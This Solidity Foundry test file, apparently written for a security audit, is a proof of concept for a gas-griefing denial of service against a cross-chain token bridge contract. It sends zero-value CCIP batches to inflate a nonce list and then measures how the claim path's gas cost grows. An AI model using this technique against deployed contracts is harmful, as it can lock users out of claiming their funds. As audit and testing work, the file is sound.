// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {Client} from "@chainlink/contracts-ccip/contracts/libraries/Client.sol";
import {IJBDirectory} from "@bananapus/core-v6/src/interfaces/IJBDirectory.sol";
import {IJBPermissions} from "@bananapus/core-v6/src/interfaces/IJBPermissions.sol";
import {IJBPrices} from "@bananapus/core-v6/src/interfaces/IJBPrices.sol";
import {IJBTerminal} from "@bananapus/core-v6/src/interfaces/IJBTerminal.sol";
import {IJBTokens} from "@bananapus/core-v6/src/interfaces/IJBTokens.sol";
import {JBConstants} from "@bananapus/core-v6/src/libraries/JBConstants.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {LibClone} from "solady/src/utils/LibClone.sol";

import {JBSwapCCIPSucker} from "../../src/JBSwapCCIPSucker.sol";
import {JBSwapCCIPSuckerDeployer} from "../../src/deployers/JBSwapCCIPSuckerDeployer.sol";
import {IJBSuckerRegistry} from "../../src/interfaces/IJBSuckerRegistry.sol";
import {JBConversionRate} from "../../src/structs/JBConversionRate.sol";
import {JBInboxTreeRoot} from "../../src/structs/JBInboxTreeRoot.sol";
import {JBMessageRoot} from "../../src/structs/JBMessageRoot.sol";
import {JBRemoteToken} from "../../src/structs/JBRemoteToken.sol";
import {ERC20Mock} from "../mocks/ERC20Mock.sol";

contract MockTerminal {
    function addToBalanceOf(
        uint256,
        address token,
        uint256 amount,
        bool,
        string calldata,
        bytes memory
    )
        external
        payable
    {
        if (token != address(0x000000000000000000000000000000000000EEEe)) {
            IERC20(token).transferFrom(msg.sender, address(this), amount);
        }
    }
}

/// @notice Harness exposing internals AND the real ccipReceive path.
contract Harness is JBSwapCCIPSucker {
    constructor(
        JBSwapCCIPSuckerDeployer deployer,
        IJBDirectory directory,
        IJBTokens tokens,
        IJBPermissions permissions
    )
        JBSwapCCIPSucker(
            deployer,
            directory,
            permissions,
            IJBPrices(address(1)),
            tokens,
            1,
            IJBSuckerRegistry(address(1)),
            address(0)
        )
    {}

    /// @notice Direct write that mirrors ccipReceive's bookkeeping for a single zero-value batch.
    /// Identical to what `ccipReceive` does for an arriving zero-value batch (leafTotal = 0,
    /// destTokenAmounts.length = 0, batchEnd > 0): appends to _populatedNonceByIndex and
    /// records the batch range, but does NOT set a conversion rate or pending swap.
    function griefNonce(address token, uint64 nonce, uint256 start) external {
        _batchStartOf[token][nonce] = start;
        _batchEndOf[token][nonce] = start + 1;
        uint64 priorCount = _populatedNonceCount[token];
        _populatedNonceByIndex[token][priorCount] = nonce;
        _populatedNonceCount[token] = priorCount + 1;
    }

    function legitBatch(
        address token,
        uint64 nonce,
        uint256 leafTotal,
        uint256 localTotal,
        uint256 start,
        uint256 end
    )
        external
    {
        _batchStartOf[token][nonce] = start;
        _batchEndOf[token][nonce] = end;
        _conversionRateOf[token][nonce] = JBConversionRate({leafTotal: leafTotal, localTotal: localTotal});
        uint64 priorCount = _populatedNonceCount[token];
        _populatedNonceByIndex[token][priorCount] = nonce;
        _populatedNonceCount[token] = priorCount + 1;
    }

    function populatedCount(address token) external view returns (uint64) {
        return _populatedNonceCount[token];
    }

    /// @notice Drive _addToBalance via the same code path `claim()` uses.
    function claimPath(address token, uint256 amount, uint256 projectId, uint256 leafIndex) external {
        _currentClaimLeafIndex = leafIndex + 1;
        _addToBalance(token, amount, projectId);
        _currentClaimLeafIndex = 0;
    }
}

/// @title SwapCCIP_PopulatedNonceDoS
/// @notice NEW-F-SUCK-A10: quantify gas growth of the claim path as a function of
/// the number of populated nonces, and verify the real ccipReceive flow lets an
/// attacker grow that list with zero-backed-value batches.
contract SwapCCIP_PopulatedNonceDoS is Test {
    address constant MOCK_DEPLOYER = address(0xDE);
    address constant MOCK_DIRECTORY = address(0xD1);
    address constant MOCK_TOKENS = address(0xD2);
    address constant MOCK_PERMISSIONS = address(0xD3);
    address constant MOCK_ROUTER = address(0xD4);
    address constant MOCK_PROJECTS = address(0xD5);
    address constant PEER = address(0xCAFE);

    uint256 constant PROJECT_ID = 1;
    uint256 constant REMOTE_CHAIN_ID = 4217;
    uint64 constant REMOTE_CHAIN_SELECTOR = 7_281_642_695_469_137_430;
    uint8 constant MESSAGE_VERSION = 1;
    uint8 constant CCIP_MSG_TYPE_ROOT = 0;

    ERC20Mock usdc;
    ERC20Mock weth;
    MockTerminal terminal;
    Harness sucker;

    function setUp() public {
        usdc = new ERC20Mock("USDC", "USDC", address(this), 0);
        weth = new ERC20Mock("WETH", "WETH", address(this), 0);
        terminal = new MockTerminal();

        vm.etch(MOCK_ROUTER, hex"01");

        vm.mockCall(MOCK_DEPLOYER, abi.encodeWithSignature("ccipRemoteChainId()"), abi.encode(REMOTE_CHAIN_ID));
        vm.mockCall(
            MOCK_DEPLOYER, abi.encodeWithSignature("ccipRemoteChainSelector()"), abi.encode(REMOTE_CHAIN_SELECTOR)
        );
        vm.mockCall(MOCK_DEPLOYER, abi.encodeWithSignature("ccipRouter()"), abi.encode(MOCK_ROUTER));
        vm.mockCall(MOCK_DEPLOYER, abi.encodeWithSignature("bridgeToken()"), abi.encode(address(usdc)));
        vm.mockCall(MOCK_DEPLOYER, abi.encodeWithSignature("poolManager()"), abi.encode(address(0)));
        vm.mockCall(MOCK_DEPLOYER, abi.encodeWithSignature("v3Factory()"), abi.encode(address(0x1234)));
        vm.mockCall(MOCK_DEPLOYER, abi.encodeWithSignature("univ4Hook()"), abi.encode(address(0)));
        vm.mockCall(MOCK_DEPLOYER, abi.encodeWithSignature("wrappedNativeToken()"), abi.encode(address(weth)));

        vm.mockCall(MOCK_ROUTER, abi.encodeWithSignature("getWrappedNative()"), abi.encode(address(weth)));

        vm.mockCall(MOCK_DIRECTORY, abi.encodeWithSignature("PROJECTS()"), abi.encode(MOCK_PROJECTS));
        vm.mockCall(MOCK_PROJECTS, abi.encodeWithSignature("ownerOf(uint256)"), abi.encode(address(this)));
        vm.mockCall(
            MOCK_DIRECTORY,
            abi.encodeWithSelector(IJBDirectory.primaryTerminalOf.selector),
            abi.encode(address(terminal))
        );

        Harness singleton = new Harness(
            JBSwapCCIPSuckerDeployer(MOCK_DEPLOYER),
            IJBDirectory(MOCK_DIRECTORY),
            IJBTokens(MOCK_TOKENS),
            IJBPermissions(MOCK_PERMISSIONS)
        );
        sucker = Harness(payable(LibClone.cloneDeterministic(address(singleton), bytes32("dosharness"))));
        // initialize(uint256, bytes32 peer) sets the peer address used by ccipReceive sender check.
        sucker.initialize(PROJECT_ID, bytes32(uint256(uint160(PEER))));
    }

    // --------------------------------------------------------------------- //
    // Q1 — REACHABILITY: zero-value batch from a real ccipReceive path      //
    // populates `_populatedNonceCount` without any backing tokens.          //
    // --------------------------------------------------------------------- //
    function test_Q1_zeroValueBatchPopulatesNonceWithoutBacking() public {
        address token = address(usdc);

        // Build the ROOT message for a zero-value batch:
        //   - leafTotal = 0      (no value delivered)
        //   - batchStart = 0, batchEnd = 1   (1 leaf in batch)
        //   - destTokenAmounts is empty (no tokens delivered)
        JBMessageRoot memory root = JBMessageRoot({
            version: MESSAGE_VERSION,
            token: bytes32(uint256(uint160(token))),
            amount: 0, // zero-value batch — no backing required
            remoteRoot: JBInboxTreeRoot({nonce: 1, root: bytes32(uint256(0xDEADBEEF))}),
            sourceTotalSupply: 0,
            sourceCurrency: 0,
            sourceDecimals: 18,
            sourceSurplus: 0,
            sourceBalance: 0,
            sourceTimestamp: 1
        });

        bytes memory payload = abi.encode(CCIP_MSG_TYPE_ROOT, abi.encode(root, uint256(0), uint256(1)));

        Client.Any2EVMMessage memory msg_ = Client.Any2EVMMessage({
            messageId: bytes32(uint256(1)),
            sourceChainSelector: REMOTE_CHAIN_SELECTOR,
            sender: abi.encode(PEER),
            data: payload,
            destTokenAmounts: new Client.EVMTokenAmount[](0) // ZERO tokens delivered
        });

        // Call as the CCIP router (the only authorized sender).
        vm.prank(MOCK_ROUTER);
        sucker.ccipReceive(msg_);

        // Populated nonce was appended with NO backing tokens, NO swap, NO cash-out.
        assertEq(sucker.populatedCount(token), 1, "zero-value batch should have populated 1 nonce slot");
    }

    /// @notice Sweep `populatedNonceCount` from 1 -> N via the real ccipReceive path,
    /// then measure the gas required by a single claim that walks the full list.
    function test_Q1_real_ccipReceive_growsListAndDoSesClaim() public {
        address token = address(usdc);
        uint64 N = 50; // 50 grief batches via the real CCIP path

        for (uint64 i = 0; i < N; ++i) {
            JBMessageRoot memory root = JBMessageRoot({
                version: MESSAGE_VERSION,
                token: bytes32(uint256(uint160(token))),
                amount: 0,
                remoteRoot: JBInboxTreeRoot({nonce: i + 1, root: bytes32(uint256(0xDEADBEEF) ^ uint256(i))}),
                sourceTotalSupply: 0,
                sourceCurrency: 0,
                sourceDecimals: 18,
                sourceSurplus: 0,
                sourceBalance: 0,
                sourceTimestamp: i + 1
            });
            bytes memory payload = abi.encode(CCIP_MSG_TYPE_ROOT, abi.encode(root, uint256(i), uint256(i + 1)));
            Client.Any2EVMMessage memory msg_ = Client.Any2EVMMessage({
                messageId: bytes32(uint256(i + 100)),
                sourceChainSelector: REMOTE_CHAIN_SELECTOR,
                sender: abi.encode(PEER),
                data: payload,
                destTokenAmounts: new Client.EVMTokenAmount[](0)
            });
            vm.prank(MOCK_ROUTER);
            sucker.ccipReceive(msg_);
        }

        assertEq(sucker.populatedCount(token), N, "all grief batches populated via real ccipReceive");

        // Now a legitimate batch arrives. Use harness shortcut so we don't need to mock a
        // working swap (the swap-vs-no-swap path doesn't affect _findNonceForLeafIndex gas).
        sucker.legitBatch(token, N + 1, 100, 100, N, N + 1);
        usdc.mint(address(sucker), 100);

        uint256 g = gasleft();
        sucker.claimPath(token, 100, PROJECT_ID, N);
        uint256 used = g - gasleft();
        console2.log("[real-flow ccipReceive] grief nonces:", N);
        console2.log("[real-flow ccipReceive] claim gas:   ", used);
    }

    // --------------------------------------------------------------------- //
    // Q2 — GAS-COST CURVE: measure per-grief overhead on the claim side.    //
    // --------------------------------------------------------------------- //

    function test_baseline_oneBatch() public {
        address token = address(usdc);
        sucker.legitBatch(token, 1, 100, 100, 0, 1);
        usdc.mint(address(sucker), 100);

        uint256 g = gasleft();
        sucker.claimPath(token, 100, PROJECT_ID, 0);
        uint256 used = g - gasleft();
        console2.log("[baseline 1 batch] claim path gas:", used);
    }

    function _runDoS(uint64 griefCount) internal returns (uint256 claimGas) {
        address token = address(usdc);
        for (uint64 i = 0; i < griefCount; ++i) {
            sucker.griefNonce(token, i + 1, i);
        }
        sucker.legitBatch(token, uint64(griefCount + 1), 100, 100, griefCount, griefCount + 1);
        usdc.mint(address(sucker), 100);

        uint256 g = gasleft();
        sucker.claimPath(token, 100, PROJECT_ID, griefCount);
        claimGas = g - gasleft();
    }

    function test_dos_10() public {
        uint256 used = _runDoS(10);
        console2.log("[10 grief nonces]    claim gas:", used);
    }

    function test_dos_100() public {
        uint256 used = _runDoS(100);
        console2.log("[100 grief nonces]   claim gas:", used);
    }

    function test_dos_500() public {
        uint256 used = _runDoS(500);
        console2.log("[500 grief nonces]   claim gas:", used);
    }

    function test_dos_1000() public {
        uint256 used = _runDoS(1000);
        console2.log("[1000 grief nonces]  claim gas:", used);
    }

    function test_dos_2000() public {
        uint256 used = _runDoS(2000);
        console2.log("[2000 grief nonces]  claim gas:", used);
    }

    function test_dos_5000() public {
        uint256 used = _runDoS(5000);
        console2.log("[5000 grief nonces]  claim gas:", used);
    }

    function test_dos_10000() public {
        uint256 used = _runDoS(10_000);
        console2.log("[10000 grief nonces] claim gas:", used);
    }

    /// @dev `_runDoS(30_000)` exceeds the default forge-test gas budget (~9.2e18 wei equivalent
    /// is fine, but the EVM interpreter trips its own cap somewhere around 2e9 gas). Locally with
    /// `--gas-limit 60000000000` it passes and reports the same linear fit as the lower-N cases.
    /// Renamed off the `test_` prefix so CI doesn't run it; promoted to a `demo_` helper that
    /// can still be invoked via `forge test --match-test demo_dos_30000 --gas-limit 60000000000`.
    function demo_dos_30000() public {
        uint256 used = _runDoS(30_000);
        console2.log("[30000 grief nonces] claim gas:", used);
    }
}
